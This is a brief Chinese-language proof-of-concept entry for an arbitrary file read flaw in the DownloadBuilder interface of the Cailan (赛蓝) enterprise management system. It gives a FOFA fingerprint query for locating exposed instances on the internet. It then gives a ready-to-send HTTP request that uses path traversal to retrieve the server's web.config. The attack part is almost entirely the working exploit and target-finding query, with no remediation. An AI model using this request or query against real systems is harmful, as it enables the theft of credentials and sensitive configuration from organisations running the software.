**fofa**

```
body="cailsoft.com" || body="赛蓝企业管理系统"
```

**一、漏洞简述**

赛蓝企业经营管理系统是一款功能强大的管理软件，能够帮助企业提升管理效率，降低成本，实现可持续发展。在使用过程中，需注意与用友畅捷通旗下产品的配合，并随时寻求免费试用或在线咨询帮助，以保证系统的最佳使用效果。其接口DownloadBuilder存在任意文件读取漏洞，攻击者可通过该漏洞获取系统敏感信息。

**二、漏洞检测poc**

```yaml
GET /BaseModule/ReportManage/DownloadBuilder?filename=/../web.config HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Connection: close
```

